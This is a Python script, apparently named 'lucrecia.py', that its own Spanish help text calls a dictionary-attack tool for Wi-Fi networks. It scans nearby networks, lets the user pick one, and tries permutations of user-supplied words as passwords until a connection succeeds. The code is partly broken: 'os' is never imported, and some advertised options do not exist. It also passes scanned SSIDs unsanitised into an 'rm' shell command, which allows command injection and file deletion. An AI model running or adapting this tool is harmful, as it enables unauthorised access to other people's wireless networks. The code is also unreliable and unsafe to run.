
import sys
import time
import argparse
import itertools

from wireless import Wireless
from tabulate import tabulate
from wifi import Cell, Scheme


def scan_networks(interface):

	networks = []

	cells = Cell.all(interface)

	for cell in list(cells):
		networks.append(cell)

	return networks


def show_networks(raw_networks):

	networks = []

	for raw_network in raw_networks:
		networks.append([raw_network.ssid,raw_network.signal,raw_network.quality,
			             raw_network.frequency,raw_network.encrypted,raw_network.channel,
			             raw_network.address,raw_network.mode,raw_network.encryption_type])


	print("\nREDES WIFI DISPONIBLES ")
	print("======================\n")

	print(tabulate(networks, headers=["ID","SSID","Signal","Quality","Frequency","Encrypted","Channel","MAC Address","Mode","Security"], tablefmt='simple', showindex=True))

	print("\n")

	return


def connect_network(ssid,password):

	wireless = Wireless()

	if wireless.connect(ssid=ssid,password=password):
		return True

	else:
		return False


def add_words():

	words = (input(" Words: ")).split(",")

	return words


def brute_force(ssid,passwords):

	long_dict = len(passwords)

	words = []

	for i in range(1,long_dict):
		for j in itertools.permutations(passwords,i):
			word = ""
			for k in j:
				word += str(k)
			words.append(word)

	for password in words:
		if connect_network(ssid,password):
			print("\n ")
			return True
		else:
			print(" Intentando -> ", password)
			os.system("rm "+ssid+"*")



def attack_slave(interface):

	raw_networks = scan_networks(interface)
	show_networks(raw_networks)

	selection = int(input(" Network(ID)-> "))
	
	words = add_words()
	brute_force(raw_networks[selection].ssid,words)

	return


def banner():

	msg = "\n\n"
	msg += " ██▓     █    ██  ▄████▄   ██▀███  ▓█████  ▄████▄   ██▓ ▄▄▄  \n"
	msg += "▓██▒     ██  ▓██▒▒██▀ ▀█  ▓██ ▒ ██▒▓█   ▀ ▒██▀ ▀█  ▓██▒▒████▄    \n"
	msg += "▒██░    ▓██  ▒██░▒▓█    ▄ ▓██ ░▄█ ▒▒███   ▒▓█    ▄ ▒██▒▒██  ▀█▄  \n"
	msg += "▒██░    ▓▓█  ░██░▒▓▓▄ ▄██▒▒██▀▀█▄  ▒▓█  ▄ ▒▓▓▄ ▄██▒░██░░██▄▄▄▄██ \n"
	msg += "░██████▒▒▒█████▓ ▒ ▓███▀ ░░██▓ ▒██▒░▒████▒▒ ▓███▀ ░░██░ ▓█   ▓██▒\n"
	msg += "░ ▒░▓  ░░▒▓▒ ▒ ▒ ░ ░▒ ▒  ░░ ▒▓ ░▒▓░░░ ▒░ ░░ ░▒ ▒  ░░▓   ▒▒   ▓▒█░\n"
	msg += "░ ░ ▒  ░░░▒░ ░ ░   ░  ▒     ░▒ ░ ▒░ ░ ░  ░  ░  ▒    ▒ ░  ▒   ▒▒ ░\n"
	msg += "  ░ ░    ░░░ ░ ░ ░          ░░   ░    ░   ░         ▒ ░  ░   ▒   \n"
	msg += "    ░  ░   ░     ░ ░         ░        ░  ░░ ░       ░        ░  ░\n"
	msg += "                 ░                        ░  \n\n"

	return msg


if __name__ == '__main__':

	print (banner())

	parser = argparse.ArgumentParser(description="Script de ataque de diccionario para redes Wi-Fi", usage="lucrecia.py MODE", epilog="""

Example: lucrecia.py slave
         lucrecia.py free -i wlp4s0 -s cisco-wf -pf passwords.txt
         lucrecia.py free -i wlp4s0 --scan True
		
		""",formatter_class=argparse.RawTextHelpFormatter)
	
	# Argumentos obligatorios
	parser.add_argument("mode", type=str, help="Mode program: [slave,free]", metavar="MODE")
	
	# Argumentos opcionales
	parser.add_argument("-i", default=Wireless().interface(), dest="interface", help="Interface network", metavar="INTERFACE")
	parser.add_argument("--scan", type=bool ,default=False, dest="scan", help="Scan networks", metavar="BOOLEAN")

	argv = parser.parse_args()

	if (argv.mode=="slave"):
		attack_slave(argv.interface)

	elif (argv.mode=="free"):
		
		if (argv.scan==True):
			raw_networks = scan_networks(argv.interface)
			show_networks(raw_networks)


	else:
		print("Error: modo ",argv.mode," no existe.\n\n")

		parser.print_help(sys.stderr)


	#if (argv.mode=="free") and (argv.scan==True):
	#	select_network(argv.interface)